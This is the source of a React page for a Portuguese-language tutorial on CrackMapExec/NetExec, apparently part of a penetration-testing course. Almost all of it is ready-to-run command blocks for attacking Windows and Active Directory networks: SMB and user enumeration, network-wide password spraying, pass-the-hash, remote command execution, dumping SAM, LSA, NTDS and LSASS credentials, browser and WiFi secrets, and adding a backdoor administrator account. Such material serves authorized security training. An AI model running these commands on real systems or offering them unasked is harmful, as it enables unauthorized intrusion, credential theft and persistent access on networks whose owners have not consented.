import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function CrackMapExec() {
  return (
    <PageContainer
      title="CrackMapExec / NetExec"
      subtitle="Use CrackMapExec (NetExec) para enumeração, spray de senhas e exploração de redes Windows e Active Directory."
      difficulty="avancado"
      timeToRead="18 min"
    >
      <h2>O que é CrackMapExec?</h2>
      <p>
        <strong>CrackMapExec (CME)</strong>, agora mantido como <strong>NetExec (nxc)</strong>, é uma
        ferramenta de pós-exploração para redes Windows/Active Directory. Permite enumeração em massa,
        spray de credenciais, execução remota e movimentação lateral.
      </p>

      <h2>Instalação</h2>
      <CodeBlock
        title="Instalar CrackMapExec/NetExec"
        code={`# NetExec (sucessor do CrackMapExec)
sudo apt install netexec

# Ou via pipx
pipx install git+https://github.com/Pennyw0rth/NetExec

# Verificar
nxc --version
# ou
crackmapexec --version`}
      />

      <h2>Enumeração SMB</h2>
      <CodeBlock
        title="Enumerar rede via SMB"
        code={`# Scan de hosts com SMB
nxc smb 192.168.1.0/24

# Resultado mostra:
# IP | Nome | Domínio | OS | SMB signing

# Enumerar shares
nxc smb 192.168.1.100 -u '' -p '' --shares
nxc smb 192.168.1.100 -u 'guest' -p '' --shares

# Enumerar usuários
nxc smb 192.168.1.100 -u '' -p '' --users
nxc smb 192.168.1.100 -u '' -p '' --rid-brute

# Enumerar grupos
nxc smb 192.168.1.100 -u user -p 'Password1' --groups

# Enumerar políticas de senha
nxc smb 192.168.1.100 -u '' -p '' --pass-pol

# Spider shares (buscar arquivos)
nxc smb 192.168.1.100 -u user -p pass --spider C$ --pattern "password"`}
      />

      <h2>Password Spraying</h2>
      <CodeBlock
        title="Spray de senhas em massa"
        code={`# Password spray (uma senha contra muitos usuários)
nxc smb 192.168.1.100 -u users.txt -p 'Summer2024!' --continue-on-success

# Com lista de senhas (cuidado com lockout!)
nxc smb 192.168.1.100 -u users.txt -p passwords.txt --no-bruteforce

# Spray com hash (Pass-the-Hash)
nxc smb 192.168.1.100 -u admin -H 'NTLM_HASH'

# Spray em toda a rede
nxc smb 192.168.1.0/24 -u 'admin' -p 'Password1' --continue-on-success

# Resultado:
# [+] = credencial válida
# [*] = admin local (Pwn3d!)

# Protocolos suportados:
nxc smb    # SMB/CIFS
nxc winrm  # WinRM (5985/5986)
nxc ssh    # SSH
nxc ldap   # LDAP
nxc mssql  # Microsoft SQL
nxc rdp    # RDP
nxc ftp    # FTP`}
      />

      <h2>Execução de Comandos</h2>
      <CodeBlock
        title="Executar comandos remotamente"
        code={`# Métodos de execução (do mais silencioso ao mais barulhento)
# wmiexec (WMI) — mais furtivo
nxc smb 192.168.1.100 -u admin -p 'Password1' -x 'whoami' --exec-method wmiexec

# smbexec — via SMB
nxc smb 192.168.1.100 -u admin -p 'Password1' -x 'ipconfig /all' --exec-method smbexec

# atexec — via Task Scheduler
nxc smb 192.168.1.100 -u admin -p 'Password1' -x 'net user' --exec-method atexec

# PowerShell command
nxc smb 192.168.1.100 -u admin -p 'Password1' -X 'Get-Process'

# Via WinRM
nxc winrm 192.168.1.100 -u admin -p 'Password1' -x 'whoami'

# Executar em toda a rede
nxc smb 192.168.1.0/24 -u admin -p 'Password1' -x 'hostname' --continue-on-success`}
      />

      <h2>Dump de Credenciais</h2>
      <CodeBlock
        title="Extrair hashes e credenciais"
        code={`# Dump SAM (hashes locais)
nxc smb 192.168.1.100 -u admin -p 'Password1' --sam

# Dump LSA secrets
nxc smb 192.168.1.100 -u admin -p 'Password1' --lsa

# Dump NTDS (Domain Controller — TODOS os hashes!)
nxc smb DC_IP -u admin -p 'Password1' --ntds

# Dump LSASS (credenciais em memória)
nxc smb 192.168.1.100 -u admin -p 'Password1' -M lsassy

# Extrair credenciais do DPAPI
nxc smb 192.168.1.100 -u admin -p 'Password1' -M dpapi_chrome

# Módulos úteis
nxc smb TARGET -u admin -p pass -M mimikatz
nxc smb TARGET -u admin -p pass -M wifi       # Senhas WiFi
nxc smb TARGET -u admin -p pass -M rdp        # Habilitar RDP`}
      />

      <h2>Movimentação Lateral</h2>
      <CodeBlock
        title="Pass-the-Hash e mais"
        code={`# Pass-the-Hash
nxc smb 192.168.1.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'

# Pass-the-Password em toda rede
nxc smb 192.168.1.0/24 -u admin -p 'Password1' --continue-on-success

# Verificar onde user é admin local
nxc smb 192.168.1.0/24 -u user -p 'pass' | grep "Pwn3d"

# Habilitar RDP remotamente
nxc smb TARGET -u admin -p pass -M rdp -o ACTION=enable

# Adicionar usuário admin
nxc smb TARGET -u admin -p pass -x 'net user hacker P@ss123 /add && net localgroup Administrators hacker /add'`}
      />
    </PageContainer>
  );
}
